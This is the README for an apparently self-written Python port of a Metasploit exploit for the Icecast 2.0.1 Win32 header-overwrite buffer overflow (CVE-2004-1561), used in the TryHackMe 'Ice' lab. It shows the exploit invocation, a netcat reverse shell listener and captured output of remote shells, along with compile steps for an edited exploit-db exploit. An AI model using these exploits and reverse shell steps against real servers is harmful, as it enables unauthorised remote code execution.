# CVE-2004-1561 Icecast Header Overwrite buffer overflow RCE < 2.0.1 (Win32)

Python 3 Icecast Header Overwrite buffer overflow RCE < 2.0.1 (Win32), rewritten from this [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/icecast_header.rb). I rewrote this from the Metasploit module because I couldn't get [this](https://www.exploit-db.com/exploits/568) to work.

## Usage:
Replace reverse shell shellcode in exploit, call it with argument for remote server and port.

```
root@Kali:~/TryHackme/Ice# ./icecast.py 192.168.92.133 8000

Done!
```
Reverse shell listener:
```
root@Kali:~/TryHackme/Ice# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49211
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>
```

## Update for 568-edit.c
Managed to get the [original exploit](https://www.exploit-db.com/exploits/568) to work. Edited according [to this](https://www.exploit-db.com/exploits/573).

### Usage for 568-edit.c
```
root@Kali:~/TryHackme/Ice# gcc 568-edit.c -o 568
root@Kali:~/TryHackme/Ice# ./568 192.168.92.133

Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 192.168.92.133:8000
- send malformed data

Server IS vulnerable!!!
```
On listener
```
root@Kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49238
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>

```
